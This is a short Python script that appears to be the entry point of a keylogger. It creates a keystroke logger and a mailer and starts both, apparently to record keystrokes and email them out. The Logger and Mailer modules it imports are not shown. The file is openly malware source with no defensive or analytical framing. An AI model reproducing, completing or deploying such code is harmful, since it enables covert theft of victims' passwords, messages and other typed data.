import os
from Mailer import Mailer
from Logger import Logger


if __name__ == "__main__":
	keyLogger = Logger()
	mailer = Mailer()
	mailer.start()
	keyLogger.start_logging()
	